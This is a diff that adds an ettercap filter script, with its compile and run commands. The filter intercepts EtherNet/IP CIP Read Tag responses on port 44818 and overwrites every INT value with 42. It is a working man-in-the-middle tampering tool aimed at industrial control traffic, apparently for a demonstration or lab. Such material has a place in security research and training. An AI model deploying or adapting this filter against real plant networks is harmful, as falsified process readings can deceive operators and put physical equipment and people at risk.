@@ -1,0 +1,26 @@
+# ettercap filter to replace every INT read tag response with value 42
+# Compile with etterfilter mitm-INT-42.ecf -o mitm-INT-42.ef
+# Use with ettercap -F mitm-INT-42.ef
+
+if (ip.proto == TCP && tcp.src == 44818) {
+    # ENIP response
+    if (DATA.data == "\x6f\x00") {
+        # ENIP Send RR Data packet
+        if (DATA.data + 30 == "\x02\x00" && DATA.data + 32 == "\x00\x00" &&
+            DATA.data + 34 == "\x00\x00" && DATA.data + 36 == "\xb2\x00") {
+            # ENIP 2 items: NULL Address and Unconnected Data Item
+            # CIP packet begins at DATA.data + 40, size at DATA.data + 38
+            if (DATA.data + 40 == "\xcc\x00" && DATA.data + 42 == "\x00\x00") {
+                # CIP response for service 0x4c with status Success
+                if (DATA.data + 44 == "\xc3\x00") {
+                    # Data type is INT, overwrite
+                    DATA.data + 46 = "\x2a\x00";
+                }
+            } else {
+                msg("Not sucessful CIP resp for 4c service\n");
+            }
+        } else {
+            msg("Not ENIP with Null Addr and Unconnected Data Item\n");
+        }
+    }
+}
